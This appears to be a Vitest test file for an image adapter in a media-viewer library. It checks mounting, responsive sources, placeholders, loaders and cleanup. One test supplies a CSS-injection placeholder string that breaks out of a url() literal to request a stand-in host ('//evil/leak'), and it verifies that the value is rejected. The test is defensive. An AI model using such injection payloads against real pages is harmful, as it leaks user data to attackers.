// @vitest-environment happy-dom

import type { AdapterCtx, Item } from '@visora/core'
import { describe, expect, it } from 'vitest'
import { imageAdapter } from './image'

const ctx = (over: Partial<AdapterCtx> = {}): AdapterCtx => ({
  signal: new AbortController().signal,
  priority: 'auto',
  ...over,
})
const img = (over: Partial<Item> = {}): Item => ({
  id: 'i',
  type: 'image',
  source: 'photo.jpg',
  ...over,
})
const slot = () => document.createElement('div')

describe('imageAdapter', () => {
  it('declares type image and supports zoom', () => {
    const a = imageAdapter()
    expect(a.type).toBe('image')
    const m = a.mount(img(), slot(), ctx())
    expect(m.supportsZoom).toBe(true)
  })

  it('mounts an <img> with decoding=async and the resolved src', () => {
    const s = slot()
    const m = imageAdapter().mount(img({ source: 'photo.jpg' }), s, ctx())
    const el = m.element as HTMLImageElement
    expect(el.tagName).toBe('IMG')
    expect(el.getAttribute('decoding')).toBe('async')
    expect(el.src).toContain('photo.jpg')
    expect(s.contains(el)).toBe(true)
  })

  it('applies srcset and sizes for a responsive source', () => {
    const m = imageAdapter().mount(
      img({ source: { src: 'a.jpg', srcset: 'a.jpg 1x, a@2x.jpg 2x', sizes: '50vw' } }),
      slot(),
      ctx(),
    )
    const el = m.element as HTMLImageElement
    expect(el.getAttribute('srcset')).toContain('a@2x.jpg 2x')
    expect(el.getAttribute('sizes')).toBe('50vw')
  })

  it('sets fetchpriority from the ctx', () => {
    const m = imageAdapter().mount(img(), slot(), ctx({ priority: 'high' }))
    expect(m.element.getAttribute('fetchpriority')).toBe('high')
  })

  it('paints a color placeholder immediately', () => {
    const m = imageAdapter().mount(img({ placeholder: '#123456' }), slot(), ctx())
    expect(m.element.style.backgroundColor).toBeTruthy()
  })

  it('paints a data-URI placeholder as a background image', () => {
    const m = imageAdapter().mount(
      img({ placeholder: 'data:image/png;base64,AAAA' }),
      slot(),
      ctx(),
    )
    expect(m.element.style.backgroundImage).toContain('data:image/png')
  })

  it('rejects a placeholder that breaks out of the url("…") literal', () => {
    // contains "/" so it passes the path heuristic, but the embedded quote would inject a
    // second comma-separated url() → attacker-controlled image request. Must be rejected.
    const m = imageAdapter().mount(img({ placeholder: 'x"), url("//evil/leak?c=' }), slot(), ctx())
    expect(m.element.style.backgroundImage).toBe('')
  })

  it('returns the naturalSize hint without a load', () => {
    const m = imageAdapter().mount(img({ naturalSize: { w: 800, h: 600 } }), slot(), ctx())
    expect(m.naturalSize?.()).toEqual({ w: 800, h: 600 })
  })

  it('resolves ready and flags loaded on the load event', async () => {
    const m = imageAdapter().mount(img(), slot(), ctx())
    m.element.dispatchEvent(new Event('load'))
    await expect(m.ready).resolves.toBeUndefined()
    expect(m.element.hasAttribute('data-visora-loaded')).toBe(true)
  })

  it('rejects ready when the signal is already aborted', async () => {
    const c = new AbortController()
    c.abort()
    const m = imageAdapter().mount(img(), slot(), ctx({ signal: c.signal }))
    await expect(m.ready).rejects.toThrow()
  })

  it('destroy removes the element from the DOM', () => {
    const s = slot()
    const m = imageAdapter().mount(img(), s, ctx())
    m.destroy()
    expect(s.contains(m.element)).toBe(false)
  })

  it('resolves a loader that returns a URL string', async () => {
    const m = imageAdapter().mount(
      img({ source: { loader: async () => 'loaded.jpg' } }),
      slot(),
      ctx(),
    )
    await new Promise((r) => setTimeout(r, 0)) // flush the loader
    m.element.dispatchEvent(new Event('load'))
    await expect(m.ready).resolves.toBeUndefined()
    expect((m.element as HTMLImageElement).src).toContain('loaded.jpg')
  })

  it('rejects ready when the loader rejects (no unhandled rejection)', async () => {
    const m = imageAdapter().mount(
      img({ source: { loader: async () => Promise.reject(new Error('boom')) } }),
      slot(),
      ctx(),
    )
    await expect(m.ready).rejects.toThrow('boom')
  })

  it('mounts a custom element returned by the loader and resolves ready', async () => {
    const custom = document.createElement('div')
    custom.id = 'custom-media'
    const s = slot()
    const m = imageAdapter().mount(img({ source: { loader: async () => custom } }), s, ctx())
    await expect(m.ready).resolves.toBeUndefined()
    expect(s.contains(custom)).toBe(true)
    expect(custom.hasAttribute('data-visora-loaded')).toBe(true)
    expect(m.element).toBe(custom)
  })
})
